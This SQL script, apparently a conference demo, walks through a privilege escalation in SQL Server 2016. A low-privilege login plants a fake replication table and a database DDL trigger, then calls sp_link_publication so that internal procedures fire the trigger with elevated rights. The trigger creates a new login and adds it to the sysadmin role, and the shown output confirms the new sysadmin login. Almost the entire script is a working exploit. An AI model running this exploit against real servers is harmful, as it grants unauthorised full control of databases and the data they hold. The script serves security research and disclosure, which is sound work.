/*
  PASS Summit 2026
  Author: Fabiano Amorim | fabianonevesamorim@hotmail.com
*/

/*
  Run this on amorim-PF5ZTLCK\SQL2016
  Run this on amorim-PF5ZTLCK\SQL2016
  Run this on amorim-PF5ZTLCK\SQL2016
*/

/*
  Step 1 - Login with AppDemo1
*/

/* 
  Create MSreplication_objects table that is required to call out exploitable path, 
  insert a few records on it and then create the DDL trigger to run elevated code. 
*/
USE DbAppDemo1
GO
EXEC AS LOGIN = 'AppDemo1'
GO
-- What can I do at server level?
SELECT * FROM sys.fn_my_permissions(NULL, 'SERVER')
GO
-- Create internal table
IF OBJECT_ID('MSreplication_objects') IS NOT NULL
  DROP TABLE [MSreplication_objects]
GO
CREATE TABLE [dbo].[MSreplication_objects]
(
[publisher] [sys].[sysname] NULL,
[publisher_db] [sys].[sysname] NULL,
[publication] [sys].[sysname] NULL,
[object_name] [sys].[sysname] NOT NULL,
[object_type] [CHAR] (2) COLLATE SQL_Latin1_General_CP1_CI_AS NOT NULL,
[article] [sys].[sysname] NULL
)
CREATE CLUSTERED INDEX [ucMSreplication_objects] ON [dbo].[MSreplication_objects] ([object_name]) ON [PRIMARY]
GO
-- Insert a at least 3 rows on MSreplication_objects
INSERT INTO dbo.MSreplication_objects
VALUES(@@SERVERNAME, DB_NAME(), 'Pub1', 'Object1', 'T', NULL),
      (@@SERVERNAME, DB_NAME(), 'Pub1', 'Object2', 'T', NULL),
      (@@SERVERNAME, DB_NAME(), 'Pub1', 'Object3', 'T', NULL)
GO

/* Create the trigger that will execute our elevated code */
IF EXISTS(SELECT * FROM sys.triggers WHERE name = 'tr_DDL_1')
  DROP TRIGGER tr_DDL_1 ON DATABASE
GO
CREATE TRIGGER tr_DDL_1
ON DATABASE   
FOR DDL_DATABASE_LEVEL_EVENTS
AS   
BEGIN
  BEGIN TRY
    -- Do I have permission to create a new login?
    IF EXISTS(SELECT * FROM sys.login_token WHERE name = 'sysadmin' AND usage = 'GRANT OR DENY')
    BEGIN
      IF SUSER_ID('*** Demo 1 - I Should Not Be Here I''m a SysAdmin now ***') IS NULL
      BEGIN
        SELECT 'Hello, it''s me :-)';
        CREATE LOGIN [*** Demo 1 - I Should Not Be Here I'm a SysAdmin now ***] WITH PASSWORD=N'complexpwd', CHECK_POLICY=OFF;
        ALTER SERVER ROLE [sysadmin] ADD MEMBER [*** Demo 1 - I Should Not Be Here I'm a SysAdmin now ***];
      END
    END
  END TRY
  BEGIN CATCH
    PRINT ERROR_MESSAGE()
  END CATCH
END
GO

/*
  This will call sys.sp_MSrepltrigpreparecert and sys.sp_MSrepltrigcertgrant.
  sys.sp_MSrepltrigpreparecert runs - alter certificate
  sys.sp_MSrepltrigcertgrant runs - create certificate, create login, create user, grant connect...
*/
USE DbAppDemo1
GO
BEGIN TRY
  EXEC sys.sp_link_publication
    @publisher = @@servername,
    @publisher_db = NULL,
    @publication = 'Pub1',
    @security_mode = 0,
    @login = 'AppDemo1',
    @password = 'password1'
END TRY
BEGIN CATCH
END CATCH
GO

/*
  Verify escalation: use the UI to show the [*** Demo 1 - I Should Not Be Here I''m a SysAdmin now ***]
  drop it and re-run sp_link_publication to recreate it.
*/
SELECT
  SUSER_ID('*** Demo 1 - I Should Not Be Here I''m a SysAdmin now ***') AS loginid,
  IS_SRVROLEMEMBER('sysadmin', '*** Demo 1 - I Should Not Be Here I''m a SysAdmin now ***') AS is_sysadmin;
GO
/*
loginid     is_sysadmin
----------- ----------
381         1
*/